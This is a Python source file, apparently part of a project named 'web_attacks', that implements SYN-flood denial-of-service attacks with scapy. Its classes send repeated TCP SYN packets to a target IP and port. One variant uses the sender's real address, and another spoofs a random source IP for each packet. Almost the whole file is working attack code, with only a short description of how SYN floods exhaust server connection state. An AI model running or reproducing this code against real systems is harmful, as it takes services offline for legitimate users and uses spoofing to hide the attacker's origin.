from abc import ABC, abstractmethod

from scapy.all import *
from scapy.layers.inet import IP, TCP

from web_attacks.attack_parameters import AttackParameters
from web_attacks.attack_type import AttackType
from web_attacks.attacks.attack import Attack
from web_attacks.utils import generate_random_ip, generate_random_big_int


class SynFloodAttack(Attack, ABC):
    @abstractmethod
    def perform_attack(self, attack_params: AttackParameters):
        pass

    def _perform_attack(self, attack_params: AttackParameters, attack_type: AttackType):
        successful_requests = 0
        client_source_ip = None
        if attack_type == AttackType.SYN_FLOOD_DIRECT:
            client_source_ip = socket.gethostbyname(socket.gethostname())
        for packet in range(attack_params.num_of_requests):
            try:
                self.__send_syn_packet(attack_params.target_ip, attack_params.target_port, client_source_ip)
                successful_requests += 1
                success_message = f"Done sending {packet + 1} packets"
                success_message += f" packets from source {client_source_ip}" if client_source_ip else ""
                success_message += "."
                print(success_message)
            except Exception as e:
                print(f"An error occurred: {e}. Sent {successful_requests} packets. \nGoodbye.")
                break

    def get_attack_description(self) -> str:
        return """A SYN-flood is a denial-of-service attack against TCP servers that exploits the TCP three-way handshake. 
The attacker sends many TCP SYN (connection-initiate) packets and then never completes the handshake. 
The target allocates half-open connection state for each incoming SYN.
If those states consume all available connection table resources, the server cannot accept legitimate connections and becomes effectively unavailable."""

    @abstractmethod
    def get_attack_name(self) -> str:
        pass

    def __send_syn_packet(self, target_address: str, target_port: int, source_address: Optional[str]):
        source_port = generate_random_big_int()
        source_seq = generate_random_big_int()
        window_size = generate_random_big_int()

        ip_packet = IP()
        ip_packet.src = source_address if source_address is not None else generate_random_ip()  # Spoofed Attack
        ip_packet.dst = target_address

        tcp_packet = TCP()
        tcp_packet.sport = source_port
        tcp_packet.dport = target_port
        tcp_packet.flags = "S"
        tcp_packet.seq = source_seq
        tcp_packet.window = window_size
        send(ip_packet / tcp_packet, verbose=0)


class SynFloodDirectAttack(SynFloodAttack):
    def perform_attack(self, attack_params: AttackParameters):
        self._perform_attack(attack_params, AttackType.SYN_FLOOD_DIRECT)

    def get_attack_description(self) -> str:
        syn_flood_description = super().get_attack_description()
        return syn_flood_description + "\nIn SYN Flood Direct attack the source ip of the malicious packets is the client's id."

    def get_attack_name(self) -> str:
        return "Syn-Flood Direct Attack"

class SynFloodSpoofedAttack(SynFloodAttack):
    def perform_attack(self, attack_params: AttackParameters):
        self._perform_attack(attack_params, AttackType.SYN_FLOOD_SPOOFED)

    def get_attack_description(self) -> str:
        syn_flood_description = super().get_attack_description()
        return syn_flood_description + "\nIn SYN Flood Spoofed attack the source ip of the malicious packets is random and spoofed, varies for each packet."

    def get_attack_name(self) -> str:
        return "Syn-Flood Spoofed Attack"